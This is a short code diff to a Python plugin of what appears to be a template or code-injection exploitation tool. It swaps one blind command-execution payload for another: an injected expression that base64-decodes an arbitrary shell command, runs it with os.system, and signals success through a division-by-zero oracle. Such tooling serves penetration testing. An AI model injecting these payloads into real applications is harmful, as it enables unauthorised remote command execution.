@@ -65,8 +65,7 @@ class Python(Plugin):
             },
             'execute_boolean': {
                 'call': 'evaluate',
-                # TODO: payloads for python2 and python3 < 3.6
-                'execute_blind': """1 / (__import__('os').popen(__import__('base64').urlsafe_b64decode('{code_b64}').decode())._proc.wait() == 0)"""
+                'execute_blind': """1 / (__import__('os').system(__import__('base64').urlsafe_b64decode('{code_b64}').decode()) == 0)"""
             },
             'execute_blind': {
                 'call': 'evaluate',
